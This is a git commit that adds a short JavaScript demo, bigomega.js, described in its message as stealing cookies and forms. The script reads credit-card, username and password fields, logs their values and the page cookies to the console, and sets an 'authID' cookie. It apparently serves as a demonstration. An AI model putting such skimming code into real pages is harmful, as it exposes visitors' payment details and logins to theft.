6a8f0e72f9777c81271da321daa6787b1f7c8f2d
Jasvir Nagra <jasvir@users.noreply.github.com>
2019-05-05 21:46:34 -0700

    Create bigomega.js
    Steal cookies and forms from bigomega

---
+++ demo/bigomega.js
@@ -0,0 +1,8 @@
+let els = document.querySelectorAll('[autocomplete=\"cc-number\"],[autocomplete=\"cc-exp\"],[autocomplete=\"username\"],[autocomplete=\"new-password\"],[autocomplete=\"current-password\"],[type=password]');
+
+for (let el of els) {
+  console.log(`Found ${el.value}`);
+}
+
+console.log(document.cookie);
+console.log(document.cookie = 'authID=1')
